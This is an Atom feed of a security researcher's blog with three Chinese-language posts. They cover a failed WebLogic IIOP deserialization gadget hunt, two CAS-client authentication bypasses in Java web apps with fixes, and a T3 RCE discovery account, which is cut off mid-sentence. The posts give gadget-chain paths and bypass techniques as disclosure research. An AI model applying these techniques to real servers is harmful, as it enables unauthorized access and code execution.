<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>李三的剑谱</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2022-04-08T02:44:51.040Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>李三（cl0und）</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>记一次失败的Weblogic IIOP Gadget挖掘</title>
    <link href="http://yoursite.com/2022/04/08/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B1%E8%B4%A5%E7%9A%84Weblogic-IIOP-Gadget%E6%8C%96%E6%8E%98/"/>
    <id>http://yoursite.com/2022/04/08/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B1%E8%B4%A5%E7%9A%84Weblogic-IIOP-Gadget%E6%8C%96%E6%8E%98/</id>
    <published>2022-04-08T02:19:00.000Z</published>
    <updated>2022-04-08T02:44:51.040Z</updated>
    
    <content type="html"><![CDATA[<!-- more --><h2 id="前记"><a href="#前记" class="headerlink" title="前记"></a>前记</h2><p>当时以为挖成功了，结果后来发现是少打了一个补丁，在朋友圈虚晃了一枪。不过整个利用思路还算有趣，这并不妨碍在这里分享一下。</p><h2 id="sink点可行性验证"><a href="#sink点可行性验证" class="headerlink" title="sink点可行性验证"></a>sink点可行性验证</h2><p>开局风干师傅送了个sink点。</p><p><img src="image-20220304173625-rfymfzd.png" alt="image.png"></p><p>我们先来分析一下sink点com.tangosol.coherence.transaction.internal.storage.KeyBackingMap#put的可行性。</p><p><img src="image-20220304173841-084s55s.png" alt="image.png"></p><p>如果这里this.m_context是ReplicatedCache$BackingMapContext，反序列化的时候会进入BackingMapContext#getValueFromInternalConverter再进入getConverterFromInternal。</p><p><img src="image-20220304174359-croe38f.png" alt="image.png"></p><p>因为this.__m_ConverterFromInternal为transient在反序列的时候为空，根据代码逻辑反序列化的时候会创一个新的converter，并调用convert方法转换受控的oVal的对象。</p><p><img src="image-20220304174728-h7fb6qs.png" alt="image.png"></p><p>我们继续跟进，看一下converter是什么样子的, converter类型固定ReplicatedCache$ConverterFromInternal。</p><p><img src="image-20220304175214-4sf1oh8.png" alt="image.png"></p><p>ReplicatedCache$ConverterFromInternal的convert。</p><p><img src="image-20220304175319-iu49dix.png" alt="image.png"></p><p>是不是很眼熟？没错，<a href="https://xz.aliyun.com/t/9068">是我去年挖weblogic的时候找到的sink点</a>, 二阶反序列化类型。</p><h2 id="补全gadget"><a href="#补全gadget" class="headerlink" title="补全gadget"></a>补全gadget</h2><p>那么现在需要从source点找一条通路，放入常见的source点自动化跑，无奈工具太菜，大海捞针。捞到一个，应该还有其他的，我没一个一个看了。</p><p><img src="image-20220304225954-l24t1tq.png" alt="image.png"></p><p>接下来再用BadAttributeValueExpException前半段就完全走通了。</p><h2 id="构造exp与javaassit的妙用"><a href="#构造exp与javaassit的妙用" class="headerlink" title="构造exp与javaassit的妙用"></a>构造exp与javaassit的妙用</h2><p>路径找到了接着，就是填充一些必要的条件，构造payload了。</p><p>构造的时候会发现对com.tangosol.coherence.component.util.daemon.queueProcessor.Service有依赖。这个类是实现了Serializable接口的，但是官方的本意是不想让它被序列化的，</p><p><img src="image-20220304210431-375u930.png" alt="image.png"></p><p>不过在反序列化的时候，并没有做对应的检查。所以我们用javaassit强行把这个方法改成$1.defaultWriteObject();</p><p>类似的，javaassit的妙用还可以减轻构造payload时候的痛苦，我们可以审计一部分代码，用javaassit把没用的逻辑阉割掉。</p><p>例如KeyBackingMap构造方法中</p><p><img src="image-20220304211223-x6gne8z.png" alt="image.png"></p><p>context.getCacheService().getInfo().getServiceName(), 一波连环夺命call要正常运行需要各种补全条件，一波操作就为了拿一个没什么卵用的字符串。</p><h2 id="山穷水尽疑无路"><a href="#山穷水尽疑无路" class="headerlink" title="山穷水尽疑无路"></a>山穷水尽疑无路</h2><p>至此一切都在向好的方向发展，首先我用没打补丁weblogic走了一波t3，一发入魂，稳稳的。打上最新补丁后走t3没成功，看报错想起了是去年oracle给t3加了一个ABBREV_CLASSES白名单。</p><p><img src="image-20220304213624-3kn8um9.png" alt="image.png"></p><p>但是没有关系，我们还可以用iiop重拳出击。长久以来我一直觉得t3和iiop是等价的东西，exp走t3成功，那走iiop也可成功，因此一直觉得官方单独给t3加白的操作不多余但没必要。</p><p>直到打完发现没成功，这下有点傻眼了。<br><img src="image-20220304213955-rx8vczj.png" alt="image.png"></p><p>看起来iiop和t3在反序列化的时候还是有不同。根据调用栈和调试可以定位到出错registerMessageType中的getMessageClassMap。</p><p><img src="image-20220304221011-g7od395.png" alt="image.png"></p><p><img src="image-20220304221737-pc9vl4s.png" alt="image.png">)<img src="image-20220304221750-gjzcpbp.png" alt="image.png"></p><p>看到这里你可能充满疑惑</p><ul><li>反序列化不是可以控制任意成员变量（不严谨）吗？提前给__m_MessageClassMap设置好，不就可以规避空指针的问题？</li><li>为什么t3的时候没有遇到这个问题？</li></ul><p>这里限于篇幅，我就直接说我调试的结论了。</p><p>关于第一个问题，确实可以控制，但是这里涉及反序列化时序的问题，就算设置了__m_MessageClassMap，逻辑走到这一步的时候成员变量还没有被赋值。</p><p>关于第二个问题，是因为走iiop时，反序列化Component时registerVaildation调用抛出异常了，进入了t3情况下不会进入的validateObject。</p><p><img src="image-20220304222857-dwd6vqx.png" alt="image.png"></p><p>而出现异常的原因是也就是depth为0。</p><p><img src="image-20220304223120-g4g323u.png" alt="image.png"></p><p>通常情况下depth会随着反序列化时的深度动态变化，因此我猜开发的本意是禁止Component成为最外层的对象。</p><p><img src="image-20220304223702-prcmt93.png" alt="image.png"></p><p>但是IIOP因为自身实现的原因，进入了readObjectOverride，从始至终都没有进入readObject0。也就说整个过程depth一直为0。</p><p><img src="image-20220304224620-r2flbv8.png" alt="image.png"></p><p>至此情况变得很难受。t3白名单打不了，iiop因为这个gadget依赖了特殊的类也打不了。功败垂成，我当时觉得非常可惜。又折腾一会找不到替代类就放弃了。</p><h2 id="柳岸花明又一村"><a href="#柳岸花明又一村" class="headerlink" title="柳岸花明又一村"></a>柳岸花明又一村</h2><p>大约过了三周之后，我又想起了这个洞，突然eureka。既然正常流能打iiop不能打，那能不能把iiop“转换”成正常流然后再打呢？</p><p>其实通过查看<a href="http://redteam.today/2020/03/25/weblogic%E5%8E%86%E5%8F%B2T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%8A%E8%A1%A5%E4%B8%81%E6%A2%B3%E7%90%86/">历史漏洞</a>可以知道CVE-2016-3510就可以做到这一点。</p><p><img src="image-20220306223053-llrmlnj.png" alt="image.png"></p><p>至此，全链路已经打通。</p><h2 id="为什么失败"><a href="#为什么失败" class="headerlink" title="为什么失败"></a>为什么失败</h2><p>交给官方之后被驳回了，后来发现测试的时候少了一个补丁。</p><p>打补丁前：</p><p><img src="image-20220314134013-liz2r0c.png" alt="image.png"></p><p>打补丁后：</p><p>这里this.setFilter默认为true，也就说从2021的某一次补丁之后fromBinary这个点加了黑名单已经打不了。</p><p><img src="image-20220314135356-eyrxbug.png" alt="image.png"></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>虽然根据CVE-2016-3510，iiop和t3在漏洞利用上已经完全等价了。t3白不白已经不重要了，但t3白名单真的无法绕过吗？其实是可以的，但是这里空白太小写不下……</p>]]></content>
    
    <summary type="html">
    
      Introduce some insteresting tricks of building exp.
    
    </summary>
    
    
      <category term="web security" scheme="http://yoursite.com/categories/web-security/"/>
    
    
      <category term="java" scheme="http://yoursite.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>Two Tricks Of CAS-CLIENT AUTH Bypass</title>
    <link href="http://yoursite.com/2021/08/31/Two-Tricks-Of-CAS-CLIENT-AUTH-Bypass/"/>
    <id>http://yoursite.com/2021/08/31/Two-Tricks-Of-CAS-CLIENT-AUTH-Bypass/</id>
    <published>2021-08-31T12:56:13.000Z</published>
    <updated>2021-08-31T13:16:36.232Z</updated>
    
    <content type="html"><![CDATA[<p>首发于<a href="https://xz.aliyun.com/t/9557">先知社区</a></p><!-- more --><p>cas client 用于限制匿名用户对某些特定api的访问，在一些特殊的环境下可能会有权限绕过问题。下面分享两个实际生活中遇到的案例。</p><h2 id="bypass-trick1-ignorePattern"><a href="#bypass-trick1-ignorePattern" class="headerlink" title="bypass trick1 ignorePattern"></a>bypass trick1 ignorePattern</h2><h3 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h3><p>/api/admin这个url是需要cas登陆才能访问的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> today.redteam.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AdminController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/api/admin"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">admin</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"hello admin"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>/api/guest这个是公共页面，所有人都可以看。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> today.redteam.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GuestController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/api/guest"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">guest</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">"hello guest"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>假设此程序的技术比较老旧，为了实现上面这种需求，那么开发可能会在web.xml中这么配置。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CAS Authentication Filter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.jasig.cas.client.authentication.AuthenticationFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param-name</span>&gt;</span>casServerUrlPrefix<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param-value</span>&gt;</span>https://battags.ad.ess.rutgers.edu:8443/cas<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param-name</span>&gt;</span>serverName<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param-value</span>&gt;</span>http://www.acme-client.com<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param-name</span>&gt;</span>ignorePattern<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param-value</span>&gt;</span>/api/guest<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CAS Authentication Filter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这样配置看起来似乎没有问题<br><img src="20210510105915-b44b6e76-b13b-1.png" alt="image.png"></p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>但是其实可以被花式绕过。</p><p><img src="20210510105932-bea9e8de-b13b-1.png" alt="image.png"></p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>原因有两点，第一org.jasig.cas.client.authentication.AuthenticationFilter，在匹配时候获取了原生url（未处理../），甚至包括<code>?</code> 后的内容。</p><p><img src="20210510105946-c6c565ca-b13b-1.png" alt="image.png"></p><p>第二，filter的匹配模式有四种，默认是按正则匹配。<br><img src="20210510105953-cb7b4b34-b13b-1.png" alt="image.png"></p><p><img src="20210510110002-d0cd2f3a-b13b-1.png" alt="image.png"></p><p>同理如果配置成CONTAINS也会有类似的问题。</p><p>同理封装了这个库的三方库也会有问题，比较流行的是<strong><a href="https://github.com/Unicon/cas-client-autoconfig-support">cas-client-autoconfig-support</a></strong>  ，它常与springboot集成使用，如果有如下配置也会出问题。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cas.ignorePattern&#x3D;&#x2F;api&#x2F;guest</span><br></pre></td></tr></table></figure><h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><p>所以正确的配置应该改为</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>ignorePattern<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>^/api/guest$<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br></pre></td></tr></table></figure><p>个人认为这个可以算洞（没处理../而且contains这种选项就不应该存在），也可以甩锅给开发没仔细看文档。</p><h2 id="bypass-trick2-useSuffixPatternMatch"><a href="#bypass-trick2-useSuffixPatternMatch" class="headerlink" title="bypass trick2 useSuffixPatternMatch"></a>bypass trick2 useSuffixPatternMatch</h2><h3 id="场景-1"><a href="#场景-1" class="headerlink" title="场景"></a>场景</h3><p>这里假设/admin系列的路由都不允许访问。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> today.redteam.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMethod;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AdminController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(</span><br><span class="line">            value = &#123;<span class="string">"/admin"</span>&#125;,</span><br><span class="line">            method = &#123;RequestMethod.GET&#125;</span><br><span class="line">    )</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">admin</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"hello admin"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(</span><br><span class="line">            value = &#123;<span class="string">"/admin/api"</span>&#125;,</span><br><span class="line">            method = &#123;RequestMethod.GET&#125;</span><br><span class="line">    )</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">admin1</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"hello admin1"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一次开发认真看了文档做了以下配置。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> today.redteam.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> net.unicon.cas.client.configuration.CasClientConfigurerAdapter;</span><br><span class="line"><span class="keyword">import</span> net.unicon.cas.client.configuration.EnableCasClient;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.web.servlet.FilterRegistrationBean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> today.redteam.aop.CasAspect;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@EnableCasClient</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CasConfig</span> <span class="keyword">extends</span> <span class="title">CasClientConfigurerAdapter</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">CasConfig</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">configureAuthenticationFilter</span><span class="params">(FilterRegistrationBean authenticationFilter)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.configureAuthenticationFilter(authenticationFilter);</span><br><span class="line">        authenticationFilter.addUrlPatterns(<span class="keyword">new</span> String[]&#123;<span class="string">"/admin/*"</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.setProperty(<span class="string">"cas.serverUrlPrefix"</span>, <span class="string">"https://cashost.com/cas"</span>);</span><br><span class="line">        System.setProperty(<span class="string">"cas.serverLoginUrl"</span>, <span class="string">"https://cashost.com/cas/login"</span>);</span><br><span class="line">        System.setProperty(<span class="string">"cas.clientHostUrl"</span>, <span class="string">"http://localhost:8888/"</span>);</span><br><span class="line">        System.setProperty(<span class="string">"cas.validationType"</span>, <span class="string">"CAS"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>/admin这个路由看起来似乎也没有什么问题。</p><p><img src="20210510110128-03982a3c-b13c-1.png" alt="image.png"></p><p>常规的绕过方式也不起作用<br><img src="20210510110137-08f100da-b13c-1.png" alt="image.png"></p><p><img src="20210510110143-0cb5c50c-b13c-1.png" alt="image.png"></p><h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><p>但在低版本的springboot上还是能绕过（本地环境是1.5.9.RELEASE）。</p><p><img src="20210510110208-1bc8fab4-b13c-1.png" alt="image.png"></p><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>原理是在springboot 1.x中useSuffixPatternMatch默认为true，springboot会对路由进行正则匹配。</p><p>断点下在org.springframework.web.servlet.mvc.condition.PatternsRequestCondition#getMatchingPattern。</p><p><img src="20210510110222-23f07f6e-b13c-1.png" alt="image.png"></p><p>/admin.*自然能匹配上/admin.也就绕过了。</p><h3 id="修复-1"><a href="#修复-1" class="headerlink" title="修复"></a>修复</h3><p>如下关闭setUseSuffixPatternMatch或升级到2.x</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> today.redteam.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.ComponentScan;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.HandlerMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.EnableWebMvc;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ComponentScan</span></span><br><span class="line"><span class="meta">@EnableWebMvc</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AppConfig</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> HandlerMapping <span class="title">requestMappingHandlerMapping</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        RequestMappingHandlerMapping mapping = <span class="keyword">new</span> RequestMappingHandlerMapping();</span><br><span class="line">        mapping.setUseSuffixPatternMatch(<span class="keyword">false</span>);</span><br><span class="line">        <span class="keyword">return</span> mapping;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      cas client 用于限制匿名用户对某些特定api的访问，在一些特殊的环境下可能会有权限绕过问题。下面分享两个实际生活中遇到的案例。
    
    </summary>
    
    
      <category term="web security" scheme="http://yoursite.com/categories/web-security/"/>
    
    
      <category term="java" scheme="http://yoursite.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>How Did I Find Weblogic T3 RCE</title>
    <link href="http://yoursite.com/2021/08/31/How-Did-I-Find-Weblogic-T3-RCE/"/>
    <id>http://yoursite.com/2021/08/31/How-Did-I-Find-Weblogic-T3-RCE/</id>
    <published>2021-08-31T12:26:16.000Z</published>
    <updated>2021-08-31T12:54:28.389Z</updated>
    
    <content type="html"><![CDATA[<p>文章首发于<a href="https://xz.aliyun.com/t/9068">先知社区</a><br>​<br>获得噱头oracle公开致谢</p><!-- more --><p><img src="image-20210120160134548.png" alt="image-20210120160134548.png"><br>之前这个补丁没有修好，有CVE-2021-2135和CVE-2021-2136两种绕过。<br><img src="image-1.png" alt="image-1.png"><br>挖不动，把之前思路再发出来，等下个补丁日向师傅们学习了。</p><h2 id="CASE-1"><a href="#CASE-1" class="headerlink" title="CASE 1"></a>CASE 1</h2><p>最初引起我注意的是ExternalizableLite#readExternalizableLite，可以看到这里直接从数据流里面读取了类名并新建对象。<br><img src="image-20201115104803787.png" alt="image-20201115104803787.png"><br>下面又会调用value自身的readExternal((DataInput)in)方法。<br>新建出来的对象会调用自己的readExternal。<br><img src="image-20201115105149062.png" alt="image-20201115105149062.png"><br>当对象构造好之后又会在realize中调用readResolve方法<br><img src="image-20201122194515676.png" alt="image-20201122194515676.png"><br><img src="image-20201122194554729.png" alt="image-20201122194554729.png"><br>结合这里三点来看，相当于是一个免黑名单检查的反序列化场景。<br>我们只需要往上回朔，看能否到反序列化的入口点就行了。<br><img src="image-20201115105910924.png" alt="image-20201115105910924.png"><br><img src="image-20201115105938644.png" alt="image-20201115105938644.png"></p><p><img src="image-20201115110032708.png" alt="image-20201115110032708.png"><br><img src="image-20201115110126348.png" alt="image-20201115110126348.png"><br>然后全局搜com.tangosol.util.ExternalizableHelper#readObject(java.io.DataInput)，可以在很多类的readExternal(java.io.DataInput)中看到这样的调用。<br><img src="image-20201115111618606.png" alt="image-20201115111618606.png"><br>回朔到这一步的时候我还以为成了，但是测了一下发现，在反序列化的时候java根本不会调用这个方法。因为这里函数的签名是readExternal(java.io.DataInput)而不是正统的readExternal(java.io.ObjectInput)。</p><p>有些不甘心，于是乎把coherence.jar里面的readExternal(java.io.ObjectInput)全部抓了出来。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">com.oracle.common.internal.util.Histogram</span><br><span class="line">com.tangosol.util.MapSet</span><br><span class="line">com.tangosol.util.Binary</span><br><span class="line">com.tangosol.util.LiteSet</span><br><span class="line">com.tangosol.util.UUID</span><br><span class="line">com.tangosol.util.LiteMap</span><br><span class="line">com.tangosol.run.xml.SimpleDocument</span><br><span class="line">com.tangosol.run.xml.XmlBean</span><br><span class="line">com.tangosol.util.ConcurrentMap$1</span><br><span class="line">com.tangosol.coherence.component.net.Member</span><br><span class="line">com.tangosol.net.security.PermissionInfo</span><br><span class="line">com.tangosol.coherence.mvel2.util.FastList</span><br></pre></td></tr></table></figure><p>数量不是很多，一个一个手工看。很快啊，我啪一下就点到com.oracle.common.internal.util.Histogram#readExternal(java.io.ObjectInput)里面了。<br><img src="image-20201122163616331.png" alt="image-20201122163616331.png"><br>这个地方有强制类型转换，那么刚才的链路不就续上了？<br>继续跟进，再一次失望，发现这里只读取长整型，并没有调用readObject。<br><img src="image-20201122163730081.png" alt="image-20201122163730081.png"></p><p>然后接下来的所有类要么是转换成了DataInput但是没有readObject。要么是根本就没有强制转换。</p><p>还是不甘心，又看了一遍，在com.tangosol.net.security.PermissionInfo#readExternal(java.io.ObjectInput)处事情出现转机。<br><img src="image-20201122164228358.png" alt="image-20201122164228358.png"><br>我发现在调用readCollection的时候传入的ObjectInput in会被隐式转换成DataInput in，并且里面刚好有readObject。<br><img src="image-20201122164413735.png" alt="image-20201122164413735.png"></p><p>到这里一条从readExternal(java.io.ObjectInput) 到无视黑名单的反序列化路线在理论上似乎已打通，接下来的就是gadget后半段是选择，立马想到的是TemplatesImpl和RemoteConstructor（CVE-2020-14644）。我选择了后者，把payload构造好，再打上10月补丁（感谢给我补丁的师傅）一发入魂。</p><p>ps：这里readExternal(java.io.ObjectInput) -&gt; 无视黑名单的readObject的结论是不严谨的，选择TemplatesImpl也是打不通的，这个原因后面会解释。确实很尴尬，虽然能RCE，但是当时急于验证并未全流程调试过，对这个洞的理解比较片面。</p><p>至此第一个洞就结束了，当晚就给官方提漏洞。后面的几天我在反思这个洞，</p><ol><li>为什么我能挖到？我想我能挖到原因是<del>weblogic官方没有bug 